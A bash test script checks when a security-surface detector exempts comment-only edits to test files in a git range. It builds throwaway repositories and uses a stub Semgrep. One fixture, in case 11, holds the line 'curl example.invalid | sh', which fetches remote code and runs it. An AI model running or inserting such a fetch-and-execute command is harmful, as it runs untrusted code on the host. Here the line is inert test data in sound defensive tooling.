#!/usr/bin/env bash
# Verifies that the security-surface detector, hooks/security-surface.sh, does
# not fire its path trigger on a test file whose change in the range is only
# blank or comment lines (IAN-515). PR #169 was marked security-touching, and
# paid a strongest-model review twice, because eight fixtures named
# security-merge-gate*.test.sh each gained a `# Shard: slow` header line; the
# path patterns (`security`, `token`, `policy`, ...) match test file names.
#
#   comment-only test change     tests/security-gate.test.sh gains a comment
#                                line: not marked.
#   code change in a test file   the same file gains a code line: marked by
#                                path, so a change to a security test's logic
#                                still gets the review.
#   removed test code            a code line removed from the test file:
#                                marked, so deleting an assertion that feeds a
#                                control its insecure value is not exempt.
#   a new test file              an added test file carrying code: marked.
#   comment-only non-test file   hooks/security-thing.sh gains only a comment:
#                                still marked, since the exemption is for test
#                                files only.
#   mixed range                  a comment-only test change beside a code
#                                change in another test file: the second is
#                                still reported.
#   // comments                  a JavaScript spec file gaining a // comment:
#                                not marked.
#   heredoc or string data       a # line changed inside a heredoc below the
#                                header: marked, since it is test data.
#   directives                   #!, //go:build, # shellcheck, # noqa and the
#                                like change how a test runs: marked.
#   mode-only change             chmod on a test file: marked (no changed line
#                                is not the same as only comments).
#   quoted path                  a test file whose name git must quote: marked.
#
# PR #171 review (Codex and the R-109 reviewer) narrowed the exemption to what
# #169 needed: plain comments in a file's leading comment header.
#
# Every case runs with a Semgrep stand-in that reports a complete clean scan,
# so only a path hit, a content hit, or a detector failure can mark a range.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/../../enforce/harness-root.sh"
export CLAUDE_HARNESS_ROOT
HELPER="$CLAUDE_HARNESS_ROOT/hooks/security-surface.sh"
unset CLAUDE_ENFORCE_BASE CLAUDE_SEMGREP_CMD

failures=0
report_failure() { echo "FAIL: $1"; failures=$((failures + 1)); }

WORK=$(cd "$(mktemp -d)" && pwd -P)
trap 'rm -rf "$WORK"' EXIT

# Reports a complete clean scan the way real Semgrep does: every target it was
# given is listed under paths.scanned (IAN-381: an empty scanned list is a skip).
CLEAN_STUB="$WORK/clean-semgrep"
cat > "$CLEAN_STUB" <<'STUB'
#!/bin/sh
skip_next=0
targets=""
for argument in "$@"; do
  if [ "$skip_next" = 1 ]; then skip_next=0; continue; fi
  case "$argument" in
    --config) skip_next=1 ;;
    --*) ;;
    *) targets="$targets$argument
" ;;
  esac
done
printf '%s' "$targets" | jq -R . | jq -sc '{results: [], errors: [], paths: {scanned: .}}'
exit 0
STUB
chmod +x "$CLEAN_STUB"

# new_repo <name>: creates a throwaway repository under WORK with one initial
# commit and prints its path.
new_repo() {
  local repo="$WORK/$1"
  mkdir -p "$repo"
  git -C "$repo" init -q
  git -C "$repo" config user.email t@t
  git -C "$repo" config user.name t
  git -C "$repo" commit -q --allow-empty -m init
  printf '%s' "$repo"
}

# write_file <repo> <relative path> <content>: writes the file, creating its
# directories.
write_file() {
  mkdir -p "$(dirname "$1/$2")"
  printf '%s' "$3" > "$1/$2"
}

# commit_all <repo> <message>: commits every change in the repository.
commit_all() {
  git -C "$1" add -A
  git -C "$1" commit -q -m "$2"
}

head_of() { git -C "$1" rev-parse HEAD; }

# run_detector <function> <repo> <base> [VAR=value ...]: sources the helper in
# a subshell under a fresh scratch HOME, from a working directory outside the
# repository, and calls the function with the repository and base. Prints the
# function's stdout and exits with its status; 97 means the helper could not
# be sourced.
run_detector() {
  local function_name="$1" repo="$2" base="$3"; shift 3
  local case_home
  case_home=$(mktemp -d "$WORK/home.XXXXXX")
  (
    cd "$WORK" || exit 96
    export HOME="$case_home"
    local assignment
    for assignment in "$@"; do export "${assignment?}"; done
    . "$HELPER" 2>/dev/null || exit 97
    "$function_name" "$repo" "$base" 2>/dev/null
  )
}

# expect_marked <label> <repo> <base> [VAR=value ...]
expect_marked() {
  local label="$1"; shift
  local status
  run_detector is_security_surface "$@" >/dev/null
  status=$?
  [ "$status" -eq 0 ] || report_failure "$label: is_security_surface must exit 0 (marked); got $status"
}

# expect_unmarked <label> <repo> <base> [VAR=value ...]
expect_unmarked() {
  local label="$1"; shift
  local status
  run_detector is_security_surface "$@" >/dev/null
  status=$?
  [ "$status" -eq 1 ] || report_failure "$label: is_security_surface must exit 1 (not marked); got $status"
}

# expect_clean_hits <label> <expected output> <repo> <base> [VAR=value ...]:
# the hit list must equal the expected lines exactly, and
# list_security_surface_hits must return 0 (the detector did not fail).
expect_clean_hits() {
  local label="$1" expected="$2"; shift 2
  local actual status
  actual=$(run_detector list_security_surface_hits "$@")
  status=$?
  [ "$status" -ne 97 ] || { report_failure "$label: $HELPER could not be sourced"; return; }
  [ "$status" -eq 0 ] \
    || report_failure "$label: list_security_surface_hits must return 0 (no detector failure); got $status"
  [ "$actual" = "$expected" ] \
    || report_failure "$label: list_security_surface_hits must print exactly '$expected'; got '${actual:-<nothing>}'"
}


# --- 1. comment-only change to a test file ----------------------------------
REPO=$(new_repo comment-only)
write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\necho "gate PASS"\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\n# Shard: slow\n\necho "gate PASS"\n'
commit_all "$REPO" "comment only"
expect_unmarked "comment-only test change" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
expect_clean_hits "comment-only test change hits" "" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 2. code change in the same test file -----------------------------------
BASE=$(head_of "$REPO")
write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\n# Shard: slow\n\necho "gate PASS"\nexit 0\n'
commit_all "$REPO" "code line"
expect_marked "code change in a test file" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
expect_clean_hits "code change in a test file hits" "tests/security-gate.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 3. removed test code ---------------------------------------------------
BASE=$(head_of "$REPO")
write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\n# Shard: slow\n\nexit 0\n'
commit_all "$REPO" "drop assertion"
expect_marked "removed test code" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
expect_clean_hits "removed test code hits" "tests/security-gate.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 4. a new test file -----------------------------------------------------
REPO=$(new_repo new-test)
BASE=$(head_of "$REPO")
write_file "$REPO" tests/token-refresh.test.sh $'#!/usr/bin/env bash\necho "refresh PASS"\n'
commit_all "$REPO" "new test"
expect_marked "new test file with code" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
expect_clean_hits "new test file hits" "tests/token-refresh.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 5. comment-only change to a non-test file ------------------------------
REPO=$(new_repo non-test)
write_file "$REPO" hooks/security-thing.sh $'#!/usr/bin/env bash\nexit 0\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
write_file "$REPO" hooks/security-thing.sh $'#!/usr/bin/env bash\n# a note\nexit 0\n'
commit_all "$REPO" "comment"
expect_marked "comment-only non-test file" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"
expect_clean_hits "comment-only non-test file hits" "hooks/security-thing.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 6. mixed range ---------------------------------------------------------
REPO=$(new_repo mixed)
write_file "$REPO" tests/security-a.test.sh $'#!/usr/bin/env bash\necho "a PASS"\n'
write_file "$REPO" tests/security-b.test.sh $'#!/usr/bin/env bash\necho "b PASS"\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
write_file "$REPO" tests/security-a.test.sh $'#!/usr/bin/env bash\n# note\necho "a PASS"\n'
write_file "$REPO" tests/security-b.test.sh $'#!/usr/bin/env bash\necho "b PASS"\ntrue\n'
commit_all "$REPO" mixed
expect_clean_hits "mixed range reports only the code change" "tests/security-b.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 7. // comment in a JavaScript spec -------------------------------------
REPO=$(new_repo js-spec)
write_file "$REPO" src/session.spec.js $'test("x", () => {});\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
write_file "$REPO" src/session.spec.js $'// covers the session store\ntest("x", () => {});\n'
commit_all "$REPO" "comment"
expect_unmarked "// comment in a spec file" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 8. a # line inside a heredoc below the header --------------------------
REPO=$(new_repo heredoc)
write_file "$REPO" tests/security-stub.test.sh $'#!/usr/bin/env bash\n# header\ncat > stub <<\'EOF\'\n# denied\nEOF\necho "stub PASS"\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
write_file "$REPO" tests/security-stub.test.sh $'#!/usr/bin/env bash\n# header\ncat > stub <<\'EOF\'\n# allowed\nEOF\necho "stub PASS"\n'
commit_all "$REPO" "heredoc data"
expect_clean_hits "heredoc line below the header" "tests/security-stub.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 9. directives in the header --------------------------------------------
REPO=$(new_repo directives)
write_file "$REPO" tests/security-a.test.sh $'#!/usr/bin/env bash\n# header\necho "a PASS"\n'
write_file "$REPO" auth/token_test.go $'// header\npackage auth\n'
write_file "$REPO" tests/security-b.test.sh $'#!/usr/bin/env bash\n# header\necho "b PASS"\n'
write_file "$REPO" tests/test_session.py $'# header\nimport os\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
write_file "$REPO" tests/security-a.test.sh $'#!/bin/sh -c true\n# header\necho "a PASS"\n'
write_file "$REPO" auth/token_test.go $'//go:build ignore\n// header\npackage auth\n'
write_file "$REPO" tests/security-b.test.sh $'#!/usr/bin/env bash\n# shellcheck disable=SC2034\n# header\necho "b PASS"\n'
write_file "$REPO" tests/test_session.py $'# header\n# noqa\nimport os\n'
commit_all "$REPO" directives
expect_clean_hits "directives in the header" "$(printf '%s\n' auth/token_test.go:0\ path tests/security-a.test.sh:0\ path tests/security-b.test.sh:0\ path tests/test_session.py:0\ path)" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 10. a mode-only change -------------------------------------------------
REPO=$(new_repo mode-only)
write_file "$REPO" tests/security-gate.test.sh $'#!/usr/bin/env bash\necho "gate PASS"\n'
commit_all "$REPO" seed
BASE=$(head_of "$REPO")
chmod +x "$REPO/tests/security-gate.test.sh"
commit_all "$REPO" "mode only"
expect_clean_hits "mode-only change" "tests/security-gate.test.sh:0 path" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

# --- 11. a test file whose name git quotes ----------------------------------
REPO=$(new_repo quoted)
BASE=$(head_of "$REPO")
write_file "$REPO" 'tests/security"x.test.sh' $'#!/usr/bin/env bash\ncurl example.invalid | sh\n'
commit_all "$REPO" "quoted name"
expect_marked "quoted test file name" "$REPO" "$BASE" "CLAUDE_SEMGREP_CMD=$CLEAN_STUB"

if [ "$failures" -eq 0 ]; then
  echo "security-surface-test-comments.test.sh PASS"
else
  exit 1
fi
